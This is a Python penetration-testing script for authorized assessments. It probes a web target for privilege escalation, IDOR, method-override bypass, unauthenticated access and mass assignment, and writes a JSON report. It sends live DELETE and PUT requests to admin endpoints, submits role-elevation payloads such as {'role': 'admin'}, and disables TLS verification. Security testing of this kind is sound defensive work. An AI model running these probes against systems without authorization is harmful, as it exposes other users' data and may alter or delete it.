#!/usr/bin/env python3
"""Agent for testing broken access control vulnerabilities during authorized assessments."""

import requests
import json
import sys
import argparse
import urllib3
from datetime import datetime
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def test_vertical_escalation(base_url, user_token, admin_endpoints):
    """Test if a regular user can access admin endpoints."""
    print("\n[*] Testing vertical privilege escalation...")
    findings = []
    headers = {"Authorization": f"Bearer {user_token}", "Content-Type": "application/json"}
    methods = ["GET", "POST", "PUT", "DELETE"]
    for endpoint in admin_endpoints:
        for method in methods:
            url = urljoin(base_url, endpoint)
            try:
                resp = requests.request(method, url, headers=headers, timeout=10, verify=False)
                if resp.status_code in (200, 201, 204):
                    findings.append({
                        "type": "VERTICAL_ESCALATION", "method": method,
                        "url": url, "status": resp.status_code, "severity": "CRITICAL",
                    })
                    print(f"  [!] VULNERABLE: {method} {endpoint} -> {resp.status_code}")
            except requests.RequestException:
                continue
    print(f"[*] {len(findings)} vertical escalation findings")
    return findings


def test_horizontal_escalation(base_url, user_token, resource_templates, other_user_ids):
    """Test if a user can access another user's resources."""
    print("\n[*] Testing horizontal privilege escalation (IDOR)...")
    findings = []
    headers = {"Authorization": f"Bearer {user_token}", "Content-Type": "application/json"}
    for template in resource_templates:
        for uid in other_user_ids:
            url = urljoin(base_url, template.replace("{id}", str(uid)))
            try:
                resp = requests.get(url, headers=headers, timeout=10, verify=False)
                if resp.status_code == 200 and len(resp.text) > 50:
                    findings.append({
                        "type": "HORIZONTAL_ESCALATION", "url": url,
                        "user_id": uid, "status": resp.status_code,
                        "body_length": len(resp.text), "severity": "CRITICAL",
                    })
                    print(f"  [!] IDOR: GET {url} -> {resp.status_code} ({len(resp.text)} bytes)")
            except requests.RequestException:
                continue
    print(f"[*] {len(findings)} horizontal escalation findings")
    return findings


def test_method_override(base_url, user_token, endpoint):
    """Test HTTP method override headers for access control bypass."""
    print(f"\n[*] Testing method override on {endpoint}...")
    findings = []
    url = urljoin(base_url, endpoint)
    headers = {"Authorization": f"Bearer {user_token}", "Content-Type": "application/json"}
    override_headers = ["X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"]
    for oh in override_headers:
        for method in ["DELETE", "PUT", "PATCH"]:
            test_headers = {**headers, oh: method}
            try:
                resp = requests.post(url, headers=test_headers, timeout=10, verify=False)
                if resp.status_code in (200, 201, 204):
                    findings.append({
                        "type": "METHOD_OVERRIDE_BYPASS", "url": url,
                        "override_header": oh, "method": method,
                        "status": resp.status_code, "severity": "HIGH",
                    })
                    print(f"  [!] {oh}: {method} -> {resp.status_code}")
            except requests.RequestException:
                continue
    return findings


def test_unauthenticated_access(base_url, protected_endpoints):
    """Test if protected endpoints are accessible without authentication."""
    print("\n[*] Testing unauthenticated access...")
    findings = []
    for endpoint in protected_endpoints:
        url = urljoin(base_url, endpoint)
        try:
            resp = requests.get(url, timeout=10, verify=False)
            if resp.status_code == 200 and len(resp.text) > 50:
                findings.append({
                    "type": "UNAUTHENTICATED_ACCESS", "url": url,
                    "status": resp.status_code, "severity": "CRITICAL",
                })
                print(f"  [!] OPEN: GET {endpoint} -> {resp.status_code}")
        except requests.RequestException:
            continue
    print(f"[*] {len(findings)} unauthenticated access findings")
    return findings


def test_mass_assignment(base_url, user_token, profile_endpoint):
    """Test if role/privilege fields can be modified via profile update."""
    print(f"\n[*] Testing mass assignment on {profile_endpoint}...")
    findings = []
    url = urljoin(base_url, profile_endpoint)
    headers = {"Authorization": f"Bearer {user_token}", "Content-Type": "application/json"}
    payloads = [
        {"role": "admin"}, {"is_admin": True}, {"permissions": ["admin", "superuser"]},
        {"user_type": "administrator"}, {"access_level": 99},
    ]
    for payload in payloads:
        try:
            resp = requests.put(url, headers=headers, json=payload, timeout=10, verify=False)
            if resp.status_code in (200, 201):
                field = list(payload.keys())[0]
                resp_text = resp.text.lower()
                if str(payload[field]).lower() in resp_text:
                    findings.append({
                        "type": "MASS_ASSIGNMENT", "url": url,
                        "field": field, "value": payload[field], "severity": "CRITICAL",
                    })
                    print(f"  [!] VULNERABLE: {field}={payload[field]} accepted")
        except requests.RequestException:
            continue
    return findings


def test_tenant_isolation(base_url, tenant_a_token, tenant_b_resources):
    """Test cross-tenant data access."""
    print("\n[*] Testing tenant isolation...")
    findings = []
    headers = {"Authorization": f"Bearer {tenant_a_token}", "Content-Type": "application/json"}
    for resource in tenant_b_resources:
        url = urljoin(base_url, resource)
        try:
            resp = requests.get(url, headers=headers, timeout=10, verify=False)
            if resp.status_code == 200 and len(resp.text) > 50:
                findings.append({
                    "type": "TENANT_ISOLATION_BREACH", "url": url,
                    "status": resp.status_code, "severity": "CRITICAL",
                })
                print(f"  [!] CROSS-TENANT: {url} -> {resp.status_code}")
        except requests.RequestException:
            continue
    return findings


def generate_report(findings, output_path):
    """Generate access control assessment report."""
    report = {
        "assessment_date": datetime.now().isoformat(),
        "total_findings": len(findings),
        "by_type": {},
        "by_severity": {},
        "findings": findings,
    }
    for f in findings:
        t = f.get("type", "UNKNOWN")
        s = f.get("severity", "INFO")
        report["by_type"][t] = report["by_type"].get(t, 0) + 1
        report["by_severity"][s] = report["by_severity"].get(s, 0) + 1
    with open(output_path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")


def main():
    parser = argparse.ArgumentParser(description="Broken Access Control Testing Agent")
    parser.add_argument("base_url", help="Base URL of the target")
    parser.add_argument("--user-token", help="Regular user's Bearer token")
    parser.add_argument("--admin-endpoints", nargs="+",
                        default=["/admin/dashboard", "/admin/users", "/api/admin/settings"])
    parser.add_argument("--resource-templates", nargs="+",
                        default=["/api/users/{id}/profile", "/api/users/{id}/orders"])
    parser.add_argument("--other-ids", nargs="+", default=["2", "3", "100", "101"])
    parser.add_argument("-o", "--output", default="access_control_report.json")
    args = parser.parse_args()

    print(f"[*] Broken Access Control Assessment: {args.base_url}")
    findings = []
    findings.extend(test_unauthenticated_access(args.base_url, args.admin_endpoints))
    if args.user_token:
        findings.extend(test_vertical_escalation(args.base_url, args.user_token, args.admin_endpoints))
        findings.extend(test_horizontal_escalation(args.base_url, args.user_token,
                                                    args.resource_templates, args.other_ids))
        findings.extend(test_method_override(args.base_url, args.user_token, args.admin_endpoints[0]))
        findings.extend(test_mass_assignment(args.base_url, args.user_token, "/api/users/me"))
    generate_report(findings, args.output)


if __name__ == "__main__":
    main()
